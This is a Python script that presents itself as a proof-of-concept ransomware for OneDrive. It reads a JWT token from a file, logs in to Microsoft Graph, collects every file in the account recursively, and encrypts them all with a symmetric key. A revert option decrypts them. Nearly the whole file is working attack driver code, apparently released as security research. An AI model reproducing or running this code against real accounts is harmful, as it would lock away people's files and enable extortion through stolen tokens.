from ransomware_utils.onedrive_objects import OneDriveFileItem
from ransomware_utils.onedrive_ransomware import OneDriveRansomware
from ransomware_utils.msgraph_objects import MicrosoftGraphAPI
import argparse


def get_target_onedrive_items(onedrive_session: MicrosoftGraphAPI):
    all_onedrive_files_to_encrypt = []
    root_folder = onedrive_session.get_root_folder_item()
    all_onedrive_items = onedrive_session.list_children_recursively(root_folder)
    items_to_encrypt = [item for item in all_onedrive_items if isinstance(item, OneDriveFileItem)]
    all_onedrive_files_to_encrypt.extend(items_to_encrypt)

    return all_onedrive_files_to_encrypt


def parse_args():
    parser = argparse.ArgumentParser(description="Proof-of-concept of running ransomware in OneDrive")
    parser.add_argument("--start-ransomware", help="Start a ransomware attack by encrypting all the remote files", action="store_true")
    parser.add_argument("--revert-ransomware", help="Revert a ransomware attack by decrypting all the remote files", action="store_true")
    parser.add_argument("--generate-key", action='store_true', help="When specified, a new key will be generated. \
                                                    Otherwise, a key will be read from the key path", default=False)
    parser.add_argument("--key-path", default="./config/key.txt", help="Path to symmetric encryption/decryption key./"
                                                                       "default: ./config/key.txt")
    parser.add_argument("--token-path", default="./config/token.txt", help="Path to the JWT token. default: ./config/token.txt")
    parser.add_argument("--encrypted-file-extension", default=".enc", help="The extension of the encrypted files. default: .enc")
    args = parser.parse_args()
    return args


def main():
    args = parse_args()
    graph_session = MicrosoftGraphAPI()
    if args.token_path:
        try:
            with open(args.token_path, "r") as f:
                token = f.read()
            graph_session.login_using_token(token)
        except Exception as e:
            raise Exception(f"Something went wrong while reading the token: {e}")
    else:
        raise FileNotFoundError("No token file path was provided")

    if args.start_ransomware:
        onedrive_ransomware = OneDriveRansomware(graph_session, args.key_path)
        all_onedrive_files_to_encrypt = get_target_onedrive_items(graph_session)
        onedrive_ransomware.start_ransomware(all_onedrive_files_to_encrypt, args.encrypted_file_extension,
                                             args.generate_key)

    if args.revert_ransomware:
        onedrive_ransomware = OneDriveRansomware(graph_session, args.key_path)
        all_onedrive_files_to_encrypt = get_target_onedrive_items(graph_session)
        onedrive_ransomware.revert_ransomware(all_onedrive_files_to_encrypt, args.encrypted_file_extension)


if "__main__" == __name__:
    main()
